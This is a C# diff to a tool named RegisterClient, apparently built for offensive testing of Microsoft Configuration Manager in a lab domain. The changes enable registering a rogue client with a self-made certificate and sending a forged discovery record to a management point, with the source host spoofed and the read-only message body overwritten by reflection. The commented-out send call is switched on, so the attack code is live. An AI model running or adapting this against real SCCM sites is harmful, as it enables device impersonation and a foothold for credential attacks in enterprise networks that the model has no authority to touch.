@@ -81,6 +81,7 @@ namespace RegisterClient
             ddrMessage.SmsId = new SmsClientId(clientId.ToString());
             string originalSourceHost = ddrMessage.Settings.SourceHost.ToString();
             ddrMessage.Settings.SourceHost = netBiosName;
+            ddrMessage.ADSiteName = null;
             ddrMessage.NetBiosName = netBiosName;
             ddrMessage.SiteCode = siteCode;
             ddrMessage.SerializeMessageBody(); // This is required to build the DDR XML and inventory report XML but must take place after all modifications to the DDR message body
@@ -92,8 +93,6 @@ namespace RegisterClient
 
             // Modify DDR XML
             string ddrBodyXml = ddrMessage.Body.ToString();
-            //string modifiedDdrBodyXml = ddrBodyXml.Replace("<ClientInstalled>1</ClientInstalled>", "<ClientInstalled>0</ClientInstalled>");
-            //MessageBody modifiedDdrBody = new MessageBody(modifiedDdrBodyXml);
             XmlDocument ddrXmlDoc = new XmlDocument();
             // Add dummy root element to appease XmlDocument parser
             ddrXmlDoc.LoadXml("<root>" + ddrBodyXml + "</root>");
@@ -102,7 +101,7 @@ namespace RegisterClient
             XmlNode modifiedDdrXml = ddrXmlDoc.SelectSingleNode("//root");
             ddrBodyXml = modifiedDdrXml.InnerXml;
             // Use reflection to modify read-only Body property
-            //typeof(ConfigMgrDataDiscoveryRecordMessage).GetProperty("Body").SetValue(ddrMessage.Body, ddrBodyXml);
+            typeof(MessageBody).GetProperty("Payload").SetValue(ddrMessage.Body, ddrBodyXml);
 
             // Modify inventory report XML
             string inventoryReportXml = ddrMessage.InventoryReport.ReportBody.RawXml;
@@ -127,23 +126,22 @@ namespace RegisterClient
             ddrMessage.Settings.Compression = MessageCompression.Zlib;
             ddrMessage.Settings.ReplyCompression = MessageCompression.Zlib;
             ddrMessage.Settings.HostName = managementPoint;
-            //ddrMessage.Validate(sender);
             Console.WriteLine($"[+] Sending DDR from {ddrMessage.SmsId} to {ddrMessage.Settings.Endpoint} endpoint on {ddrMessage.Settings.HostName}:{ddrMessage.SiteCode} spoofing {ddrMessage.Settings.SourceHost} and requesting reply to {ddrMessage.Settings.ReplyEndpoint}");
-            //ddrMessage.SendMessage(sender);
+            ddrMessage.SendMessage(sender);
         }
 
         static void Main(string[] args)
         {
             // User-defined vars
-            string clientFqdn = "testing.aperture.science";
-            string netBiosName = "testing";
+            string clientFqdn = "testing2.aperture.science";
+            string netBiosName = "testing2";
             string managementPoint = "atlas.aperture.science";
             string siteCode = "PS1";
 
             // Add admin check here -- seems to be required to create a certificate
             MessageCertificateX509 certificate = CreateCertificate();
-            //SmsClientId clientId = RegisterClient(certificate, clientFqdn, netBiosName, managementPoint, siteCode);
-            SmsClientId clientId = new SmsClientId("GUID:C9EA062A-46D6-4306-9FEB-9E842DA72CD1");
+            SmsClientId clientId = RegisterClient(certificate, clientFqdn, netBiosName, managementPoint, siteCode);
+            //SmsClientId clientId = new SmsClientId("GUID:C9EA062A-46D6-4306-9FEB-9E842DA72CD1");
             SendDDR(certificate, clientFqdn, netBiosName, managementPoint, siteCode, clientId);
 
             /*
